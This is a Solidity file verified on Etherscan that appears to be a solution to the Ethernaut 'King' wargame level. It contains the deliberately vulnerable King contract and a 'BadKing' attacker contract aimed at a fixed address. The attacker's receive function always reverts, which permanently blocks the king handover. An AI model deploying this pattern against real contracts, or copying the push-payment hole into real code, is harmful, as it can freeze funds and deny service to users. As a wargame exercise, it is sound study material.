/**
 *Submitted for verification at Etherscan.io on 2022-09-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract BadKing {
    King public king = King(0xfFE0977336b98531f0e908cf4aF2a6ef306717F4);
    
    // Create a malicious contract and seed it with some Ethers
    constructor() public {
    }

    function becomeKing() external payable returns (bool) {
        payable(king).transfer(msg.value);
        return true;
    }
        
    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        revert("haha you fail");
    }
}